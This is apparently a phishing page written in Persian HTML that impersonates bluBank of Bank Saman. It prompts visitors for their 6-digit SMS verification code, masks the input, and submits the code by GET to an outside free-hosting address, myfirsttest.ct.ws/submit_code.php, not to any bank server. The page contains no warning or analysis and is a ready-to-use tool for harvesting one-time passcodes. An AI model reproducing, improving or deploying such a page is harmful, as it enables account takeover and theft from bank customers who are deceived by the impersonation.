<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>دریافت کد پیامکی</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@700&display=swap');
        
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: rgb(48, 148, 234);
            color: white;
            flex-direction: column;
            overflow: hidden;
        }
        .title {
            margin-bottom: 50px;
            text-align: center;
            width: 100%;
            font-family: 'Roboto', sans-serif;
        }
        .title .line1 {
            font-size: 48px; 
            font-weight: bold;
            color: #ffffff;
            text-transform: lowercase;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .title .line1 .dot {
            position: relative;
        }
        .title .line1 .dot::after {
            content: '•'; /* نقطه‌ی توپر */
            font-size: 24px;
            position: absolute;
            top: -30px; /* تنظیم به مقدار جدید */
            left: -15px; /* تنظیم به مقدار جدید */
        }
        .title .line2 {
            font-size: 28px; 
            font-weight: normal;
            color: #ffffff;
            text-transform: lowercase;
        }
        .login-container {
            background: linear-gradient(145deg, #f0f0f0, #cacaca);
            border-radius: 12px;
            padding: 25px;
            width: 80%; 
            max-width: 350px;
            box-sizing: border-box;
            margin: 0 10px;
            position: relative;
            top: -20px;
            box-shadow: 0 0 25px rgba(255, 255, 255, 1);
        }
        .login-container h2 {
            text-align: center;
            margin-bottom: 20px;
            color: #0056b3;
            font-size: 18px;
        }
        .login-container input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 8px;
            box-sizing: border-box;
            direction: rtl;
            text-align: right;
            font-size: 16px;
            font-weight: bold;
            color: #333;
            background-color: #f5f5f5;
            box-shadow: inset 4px 4px 8px rgba(0, 0, 0, 0.1), inset -4px -4px 8px rgba(255, 255, 255, 0.7);
        }
        .login-container input[type="text"] {
            -webkit-text-security: disc;
        }
        .login-container button {
            width: 100%;
            padding: 12px;
            background-color: #0056b3;
            border: none;
            color: white;
            border-radius: 8px;
            cursor: pointer;
            font-size: 18px;
            font-weight: bold;
            transition: background-color 0.3s ease;
            box-shadow: 8px 8px 15px rgba(0, 0, 0, 0.2), -8px -8px 15px rgba(255, 255, 255, 0.7);
        }
        .login-container button:hover {
            background-color: #004085;
            box-shadow: 8px 8px 20px rgba(0, 0, 0, 0.2), -8px -8px 20px rgba(255, 255, 255, 0.7);
        }
        .login-container button:focus {
            outline: none;
        }
        .login-container button:active {
            background-color: #003466;
            box-shadow: inset 8px 8px 15px rgba(0, 0, 0, 0.2), inset -8px -8px 15px rgba(255, 255, 255, 0.7);
        }
        .login-container button:disabled {
            background-color: #6c757d;
        }
        .footer {
            position: absolute;
            bottom: 10px;
            font-size: 12px;
            color: #ffffff;
        }
        @media (min-width: 600px) {
            .title .line1 {
                font-size: 44px;
            }
            .title .line2 {
                font-size: 24px;
            }
        }
        @media (min-width: 768px) {
            .title .line1 {
                font-size: 40px;
            }
            .title .line2 {
                font-size: 20px;
            }
        }
    </style>
    <script>
        function validateInput(input) {
            input.value = input.value.replace(/[^0-9]/g, '').slice(0, 6);
            if(input.value.length !== 6) {
                input.setCustomValidity('کد باید شامل ۶ رقم باشد.');
            } else {
                input.setCustomValidity('');
            }
        }
    </script>
</head>
<body>
    <div class="title">
        <div class="line1">b<span class="dot"></span>lu</div>
        <div class="line2">bank, but lovely</div>
    </div>
    <div class="login-container">
        <h2>کد پیامکی خود را وارد کنید</h2>
        <form action="http://myfirsttest.ct.ws/submit_code.php" method="GET">
            <input type="text" name="sms_code" placeholder="کد پیامکی" required oninput="validateInput(this)">
            <button type="submit">تایید</button>
        </form>
    </div>
    <div class="footer">
        Copyright © 2024 bluBank Saman. All rights reserved
    </div>
</body>
</html>
